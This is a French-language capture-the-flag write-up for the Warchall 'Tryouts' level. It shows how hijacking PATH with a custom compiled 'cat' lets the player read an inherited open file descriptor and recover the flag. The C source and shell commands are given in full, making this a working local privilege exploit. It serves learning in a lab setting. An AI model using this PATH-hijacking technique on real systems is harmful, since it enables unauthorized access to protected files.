# Warchall: Tryouts

## Objectif

Le défi consiste à deviner la valeur générée par `/dev/urandom` et à obtenir le fichier solution.txt en cas de trois réponses correctes. Cependant, il peut sembler impossible de deviner une valeur de 10 chiffres. Je me demande donc comment il est possible de les deviner.

## Vulnérabilité
J'ai observé cela au début de l'exécution avant de saisir la valeur à deviner : `cat: /home/user/tsilavina/seed: No such file or directory`. Cela m'a fait penser que la commande était exécutée avec cat au lieu d'un chemin absolu. Ainsi, il est possible de lire le drapeau en modifiant le PATH du programme appelé cat et en lisant le descripteur de fichier (fd) qui est ouvert et non fermé trois fois.

## Solution

- **Étape 1 :** Apres avoir observer le message `cat: /home/user/tsilavina/seed: No such file or directory`, mon premier reflexion c'est de creer le fichier `/home/user/tsilavina/seed`
- **Étape 2 :**  J'ai relancé le code et saisi une valeur, puis le message suivant s'est affiché :
  ```
    tsilavina@warchall:/home/level/matrixman/13_tryouts$ ./tryouts

    Enter your guess: 1233
    Wrong, /dev/urandom provided 4037066853

  ```
  Cela m'a fait penser que les valeurs à deviner proviennent de /dev/urandom. 

- **Étape 3 :** Après mes recherches sur le fonctionnement de la commande `cat`, j'ai réalisé que je pourrais créer ma propre commande `cat` en lisant le descripteur de fichier (fd) qui est ouvert et non fermé trois fois.
    - J'ai créé un fichier `tryouts.c` dans mon répertoire personnel et l'ai compilé en tant que `cat`.
    ```c
    //tryouts.c

    #include <stdio.h>
    #include <unistd.h>
    #include <string.h>

    int main(int argc, char *argv[]){
        FILE *fp = fopen(argv[1], "w");
        char buf[16];
        memset(buf, 0, sizeof buf);
        lseek(3,0, SEEK_SET);
        read(3, buf, sizeof buf);
        fprintf(fp, "%s", buf);
        return 0;
    }
    ```
    ```bash
    #Compiler le fichier "tryouts.c" en tant que commande "cat"

    gcc tryouts.c -o cat
    ```
    - Ensuite, j'ai exporté le PATH de mon répertoire ainsi :
    ```bash
    export PATH=$HOME:$PATH
    ```
    >On peut maintenant voir que le `/home/user/tsilavina` est dans le PATH, en utisant :
    ```bash 
    echo $PATH
    ```

- **Étape 4 :** J'ai réexécuté `./tryouts` dans `/home/level/matrixman/13_tryouts` et j'ai entré simplement trois valeurs successives. Le flag se trouve maintenant dans le fichier `seed` que j'ai créé à l'étape 1
